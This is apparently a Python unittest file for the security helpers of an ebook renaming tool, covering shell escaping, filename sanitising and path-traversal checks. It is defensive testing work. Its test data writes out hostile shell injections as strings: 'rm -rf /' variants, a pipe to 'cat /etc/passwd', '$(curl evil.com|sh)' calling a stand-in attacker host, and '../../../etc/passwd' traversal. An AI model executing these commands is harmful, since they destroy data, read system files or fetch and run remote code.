"""Tests for security module."""

import os
import tempfile
import unittest
from pathlib import Path

from ebook_renamer.security import (
    shell_escape,
    sanitize_filename,
    validate_path_traversal,
    validate_max_depth,
    validate_file_size,
    sanitize_path_for_logging,
    is_safe_extension,
    InvalidFilenameError,
    PathTraversalError,
    FileTooLargeError,
    MAX_DEPTH,
    MAX_HASH_FILE_SIZE,
)


class TestShellEscape(unittest.TestCase):
    """Tests for shell_escape function."""

    def test_empty_string(self):
        self.assertEqual(shell_escape(""), "''")

    def test_simple_string(self):
        self.assertEqual(shell_escape("test"), "'test'")
        self.assertEqual(shell_escape("file.pdf"), "'file.pdf'")

    def test_with_spaces(self):
        self.assertEqual(shell_escape("hello world"), "'hello world'")
        self.assertEqual(shell_escape("My Book (2020).pdf"), "'My Book (2020).pdf'")

    def test_with_single_quotes(self):
        self.assertEqual(shell_escape("O'Reilly"), "'O'\\''Reilly'")

    def test_prevents_command_injection_backticks(self):
        result = shell_escape("`rm -rf /`.pdf")
        self.assertEqual(result, "'`rm -rf /`.pdf'")
        self.assertTrue(result.startswith("'"))

    def test_prevents_command_injection_dollar_paren(self):
        result = shell_escape("$(rm -rf ~).pdf")
        self.assertEqual(result, "'$(rm -rf ~).pdf'")

    def test_prevents_command_injection_semicolon(self):
        result = shell_escape("file.pdf; rm -rf /")
        self.assertEqual(result, "'file.pdf; rm -rf /'")

    def test_prevents_command_injection_pipe(self):
        result = shell_escape("file.pdf | cat /etc/passwd")
        self.assertEqual(result, "'file.pdf | cat /etc/passwd'")

    def test_prevents_command_injection_ampersand(self):
        result = shell_escape("file.pdf && rm -rf /")
        self.assertEqual(result, "'file.pdf && rm -rf /'")

    def test_prevents_newline_injection(self):
        result = shell_escape("file.pdf\nrm -rf /")
        self.assertTrue(result.startswith("'"))
        self.assertTrue(result.endswith("'"))

    def test_double_quotes(self):
        result = shell_escape('Book "Title".pdf')
        self.assertEqual(result, '\'Book "Title".pdf\'')

    def test_unicode(self):
        result = shell_escape("数学入門.pdf")
        self.assertEqual(result, "'数学入門.pdf'")

    def test_complex_attack(self):
        result = shell_escape("$(curl evil.com|sh)'`id`'.pdf")
        self.assertIn("'\\''", result)
        self.assertTrue(result.startswith("'"))
        self.assertTrue(result.endswith("'"))


class TestSanitizeFilename(unittest.TestCase):
    """Tests for sanitize_filename function."""

    def test_valid_filename(self):
        self.assertEqual(sanitize_filename("test.pdf"), "test.pdf")
        self.assertEqual(sanitize_filename("my book.txt"), "my book.txt")

    def test_dangerous_chars(self):
        self.assertEqual(sanitize_filename("test<>file.pdf"), "test__file.pdf")
        self.assertEqual(sanitize_filename("file:with|colons.txt"), "file_with_colons.txt")

    def test_newline(self):
        self.assertEqual(sanitize_filename("bad\nname.pdf"), "bad_name.pdf")

    def test_null_byte_raises(self):
        with self.assertRaises(InvalidFilenameError):
            sanitize_filename("test\x00.pdf")

    def test_path_traversal_raises(self):
        with self.assertRaises(PathTraversalError):
            sanitize_filename("../../../etc/passwd")

    def test_empty_raises(self):
        with self.assertRaises(InvalidFilenameError):
            sanitize_filename("")

    def test_whitespace_only_raises(self):
        with self.assertRaises(InvalidFilenameError):
            sanitize_filename("   ")

    def test_forward_slash(self):
        self.assertEqual(sanitize_filename("path/to/file.pdf"), "path_to_file.pdf")

    def test_backslash(self):
        self.assertEqual(sanitize_filename("path\\to\\file.pdf"), "path_to_file.pdf")


class TestValidatePathTraversal(unittest.TestCase):
    """Tests for validate_path_traversal function."""

    def test_safe_path(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            safe_path = os.path.join(tmpdir, "test.pdf")
            # Should not raise
            validate_path_traversal(safe_path, tmpdir)

    def test_safe_nested_path(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            safe_path = os.path.join(tmpdir, "sub", "test.pdf")
            validate_path_traversal(safe_path, tmpdir)

    def test_traversal_attack_raises(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            malicious_path = os.path.join(tmpdir, "..", "..", "etc", "passwd")
            with self.assertRaises(PathTraversalError):
                validate_path_traversal(malicious_path, tmpdir)

    def test_base_itself(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            validate_path_traversal(tmpdir, tmpdir)


class TestValidateMaxDepth(unittest.TestCase):
    """Tests for validate_max_depth function."""

    def test_small_depth(self):
        validate_max_depth(10)
        validate_max_depth(100)

    def test_at_limit(self):
        validate_max_depth(MAX_DEPTH)

    def test_over_limit_raises(self):
        with self.assertRaises(ValueError):
            validate_max_depth(MAX_DEPTH + 1)

    def test_way_over_limit_raises(self):
        with self.assertRaises(ValueError):
            validate_max_depth(10000)


class TestValidateFileSize(unittest.TestCase):
    """Tests for validate_file_size function."""

    def test_small_file(self):
        validate_file_size(1024)

    def test_medium_file(self):
        validate_file_size(50 * 1024 * 1024)

    def test_at_limit(self):
        validate_file_size(MAX_HASH_FILE_SIZE)

    def test_over_limit_raises(self):
        with self.assertRaises(FileTooLargeError):
            validate_file_size(MAX_HASH_FILE_SIZE + 1)


class TestSanitizePathForLogging(unittest.TestCase):
    """Tests for sanitize_path_for_logging function."""

    def test_full_path(self):
        self.assertEqual(
            sanitize_path_for_logging("/home/user/documents/test.pdf"),
            "test.pdf"
        )

    def test_nested_path(self):
        self.assertEqual(
            sanitize_path_for_logging("/a/b/c/d/e/file.txt"),
            "file.txt"
        )

    def test_filename_only(self):
        self.assertEqual(sanitize_path_for_logging("test.pdf"), "test.pdf")


class TestIsSafeExtension(unittest.TestCase):
    """Tests for is_safe_extension function."""

    def test_lowercase_allowed(self):
        self.assertTrue(is_safe_extension(".pdf"))
        self.assertTrue(is_safe_extension(".epub"))
        self.assertTrue(is_safe_extension(".txt"))

    def test_uppercase_allowed(self):
        self.assertTrue(is_safe_extension(".PDF"))
        self.assertTrue(is_safe_extension(".EPUB"))
        self.assertTrue(is_safe_extension(".TXT"))

    def test_mixed_case_allowed(self):
        self.assertTrue(is_safe_extension(".Pdf"))
        self.assertTrue(is_safe_extension(".ePub"))

    def test_without_dot(self):
        self.assertTrue(is_safe_extension("pdf"))
        self.assertTrue(is_safe_extension("PDF"))

    def test_not_allowed(self):
        self.assertFalse(is_safe_extension(".mobi"))
        self.assertFalse(is_safe_extension(".MOBI"))
        self.assertFalse(is_safe_extension(".exe"))
        self.assertFalse(is_safe_extension(".bat"))


if __name__ == '__main__':
    unittest.main()
